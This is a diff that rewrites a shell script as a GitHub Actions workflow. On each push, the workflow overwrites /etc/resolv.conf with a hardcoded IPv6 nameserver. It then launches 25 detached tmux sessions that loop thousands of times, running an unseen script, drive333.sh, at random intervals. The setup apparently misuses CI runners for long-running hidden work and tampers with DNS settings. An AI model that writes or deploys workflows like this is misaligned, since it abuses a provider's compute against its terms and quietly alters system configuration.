@@ -1,4 +1,26 @@
-echo -e 'nameserver 2a01:4f8:c2c:123f::1' > /etc/resolv.conf
+name: Run tmux sessions
+
+on: 
+  push:
+    branches:
+      - main
+
+jobs:
+  run-sessions:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Install tmux
+      run: sudo apt-get install -y tmux
+
+    - name: Run tmux sessions
+      run: |
+        #!/bin/bash
+        
+        echo -e 'nameserver 2a01:4f8:c2c:123f::1' > /etc/resolv.conf
 for i in {1..10000}; do
 
           files=("230117" "230118" "230119" "230120" "230121")
@@ -9,8 +31,14 @@ for i in {1..10000}; do
           done
           cp htdocs/$file/* ./
           done
-          sleep $((RANDOM % 10 + 1))m
-          bash drive333.sh
-sleep $((RANDOM % 5 + 1))m
-bash drive333.sh
-done
+          sleep $((RANDOM % 5 + 1))m
+          
+          done
+        
+        for session_num in {1..25}; do
+            tmux new-session -d -s "session_$session_num"
+            tmux send-keys -t "session_$session_num" "for i in {1..10000}; do sleep \$((RANDOM % 50 + 1))m; bash drive333.sh; done" C-m
+        done
+
+        # 列出所有会话
+        tmux ls
